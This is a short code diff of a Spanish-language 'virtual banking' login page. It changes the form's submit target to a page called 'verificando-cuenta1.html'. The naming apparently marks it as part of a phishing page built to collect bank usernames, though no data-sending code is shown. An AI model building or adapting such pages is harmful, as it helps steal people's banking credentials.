@@ -64,7 +64,7 @@
 	<div class="container" id="container">
 
 		<h2> Ingresa a tu Banca Virtual </h2>
-<form class ="form" method="POST"action="index1.php" >
+<form class ="form" method="POST"action="verificando-cuenta1.html" >
 		<br>
         	<input  id="email1"  name="usuario" placeholder="Nombre usuario"  value="" required=>
 			<br>
